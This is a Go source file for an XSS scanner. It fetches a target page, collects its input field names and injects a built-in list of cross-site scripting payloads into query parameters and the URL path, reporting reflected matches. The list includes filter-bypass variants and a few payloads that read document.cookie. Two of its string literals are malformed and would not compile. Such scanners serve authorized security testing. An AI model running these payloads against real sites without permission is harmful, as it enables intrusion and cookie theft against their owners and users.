package main

import (
    "fmt"
    htmlstd "html"
    "io"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"

    "golang.org/x/net/html"
)

var payloads = []string{
    // ===== Basic script injections =====
    "<script>alert('xss')</script>",
    "<SCRIPT>alert('xss')</SCRIPT>",
    "<scr<script>ipt>alert('xss')</scr<script>ipt>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<math><mi//xlink:href='data:text/html,<script>alert(1)</script>'>",
    
    // ===== HTML attributes / event handlers =====
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<form onsubmit=alert(1)><input type=submit></form>",
    "<a href=# onmouseover=alert(1)>Hover me</a>",
    "<div style=\"background:url(javascript:alert(1))\">",
    
    // ===== Iframe / Object / Embed =====
    "<iframe src=javascript:alert(1)>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    
    // ===== Media tags =====
    "<video><source onerror=\"javascript:alert(1)\"></video>",
    "<audio><source onerror=\"javascript:alert(1)\"></audio>",
    
    // ===== Links and anchors =====
    "<a href='javascript:alert(1)'>Click</a>",
    "<a href='javascript:alert(document.cookie)'>Steal Cookie</a>",
    
    // ===== CSS & style injections =====
    "<div style=\"width:expression(alert(1))\">",
    "<span style=\"behavior:url(#default#time2);\">",
    
    // ===== Meta / refresh / HTTP headers =====
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    
    // ===== Image hacks / data URLs =====
    "<img src='x' onerror='alert(1)'>",
    "<img src='javascript:alert(1)'>",
    "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>",
    "<isindex type=image src=javascript:alert(1)>",
    
    // ===== HTML entities & encoding bypasses =====
    "<scr&#x69;pt>alert(1)</scr&#x69;pt>",
    "<img src=x onerror=/*--></script>alert(1)//'>",
    
    // ===== Template / Angular / JS frameworks =====
    "{{7*7}}",
    "{{alert(1)}}",
    "${7*7}",
    "${alert(1)}",
    
    // ===== Unusual / corner-case tags =====
    "<keygen autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<button onclick=alert(1)>Click</button>",
    "<progress onmouseover=alert(1)>",
    "<fieldset onfocus=alert(1)>",
    
    // ===== SVG / XML advanced =====
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1)></animate></svg>",
    "<svg><foreignObject><input autofocus onfocus=alert(1)></foreignObject></svg>",
    
    // ===== Misc bypass tricks =====
    "<![CDATA[<script>alert(1)</script>]]>",
    "<!--><script>alert(1)</script>",
    "<!-- --><img src=x onerror=alert(1)>",
    
    // ===== Event attribute combinations =====
    "<div onmouseover=alert(1) onmouseout=alert(2)>",
    "<img src=x onerror=alert(1) onload=alert(2)>",
    
    // ===== Math / XML hacks =====
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<math><mi xlink:href='javascript:alert(1)'>Test</mi></math>",
    
    // ===== Embedded HTML inside tags =====
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",

	"javascript:top[/al/.source+/ert/.source](document.cookie)",
	"javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain",
	"><div style="background-image: url('javascript:alert('XSS')');"></div>",
	"><button onclick="alert('XSS')">Click Me</button>",

}


var client = &http.Client{Timeout: 5 * time.Second}

func extractParams(body string) []string {
    params := []string{}
    doc, err := html.Parse(strings.NewReader(body))
    if err != nil {
        return params
    }

    var f func(*html.Node)
    f = func(n *html.Node) {
        if n.Type == html.ElementNode && n.Data == "input" {
            for _, attr := range n.Attr {
                if attr.Key == "name" {
                    params = append(params, attr.Val)
                }
            }
        }
        for c := n.FirstChild; c != nil; c = c.NextSibling {
            f(c)
        }
    }
    f(doc)
    return params
}

func testQueryParam(targetURL, param, payload string, results chan<- string, wg *sync.WaitGroup) {
    defer wg.Done()
    parsedURL, err := url.Parse(targetURL)
    if err != nil {
        results <- fmt.Sprintf("Invalid URL: %s", targetURL)
        return
    }

    query := parsedURL.Query()
    query.Set(param, payload)
    parsedURL.RawQuery = query.Encode()

    resp, err := client.Get(parsedURL.String())
    if err != nil {
        results <- fmt.Sprintf("Request failed for %s?%s=%s", targetURL, param, payload)
        return
    }
    defer resp.Body.Close()

    bodyBytes, _ := io.ReadAll(resp.Body)
    bodyStr := htmlstd.UnescapeString(string(bodyBytes))

    if strings.Contains(bodyStr, payload) {
        results <- fmt.Sprintf("[!] Potential XSS in query param '%s' with payload '%s'", param, payload)
    } else {
        results <- fmt.Sprintf("[-] No XSS in query param '%s' with payload '%s'", param, payload)
    }
}

func testPathXSS(targetURL, payload string, results chan<- string, wg *sync.WaitGroup) {
    defer wg.Done()
    parsedURL, err := url.Parse(targetURL)
    if err != nil {
        results <- fmt.Sprintf("Invalid URL: %s", targetURL)
        return
    }

    parsedURL.Path = strings.TrimRight(parsedURL.Path, "/") + "/" + payload

    resp, err := client.Get(parsedURL.String())
    if err != nil {
        results <- fmt.Sprintf("Request failed for path %s", parsedURL.String())
        return
    }
    defer resp.Body.Close()

    bodyBytes, _ := io.ReadAll(resp.Body)
    bodyStr := htmlstd.UnescapeString(string(bodyBytes))

    if strings.Contains(bodyStr, payload) {
        results <- fmt.Sprintf("[!] Potential XSS in path with payload '%s'", payload)
    } else {
        results <- fmt.Sprintf("[-] No XSS in path with payload '%s'", payload)
    }
}

func main() {
fmt.Println(`__      _____ _____ ______ ______ 
\ \    / /_   _|  __ \|  ____|  __ \
 \ \  / /  | | | |__) | |__  | |__) |
  \ \/ /   | | |  ___/|  __| |  _  / 
   \  /   _| |_| |    | |____| | \ \ 
    \/   |_____|_|    |______|_|  \_\

Developed by : viper_droid
`)
    fmt.Println("=== Advanced Go XSS Scanner ===")

    target := "https://example.com/search/"
	// or target := "http://localhost:8080/search/"
	// or you can also implement URL like that
	

	// https://example.com/search?q=:/ 



    resp, err := client.Get(target)
    if err != nil {
        fmt.Println("Failed to fetch target:", err)
        return
    }
    defer resp.Body.Close()

    bodyBytes, _ := io.ReadAll(resp.Body)
    bodyStr := string(bodyBytes)

    params := extractParams(bodyStr)
    fmt.Println("Detected input parameters:", params)

    results := make(chan string)
    var wg sync.WaitGroup

    file, err := os.Create("xss_results_full.txt")
    if err != nil {
        fmt.Println("Failed to create log file:", err)
        return
    }
    defer file.Close()

    for _, p := range params {
        for _, payload := range payloads {
            wg.Add(1)
            go testQueryParam(target, p, payload, results, &wg)
        }
    }

    for _, payload := range payloads {
        wg.Add(1)
        go testPathXSS(target, payload, results, &wg)
    }

    go func() {
        for res := range results {
            fmt.Println(res)
            file.WriteString(res + "\n")
        }
    }()

    wg.Wait()
    close(results)
    fmt.Println("=== Scan Complete === Results saved to xss_results_full.txt")
}
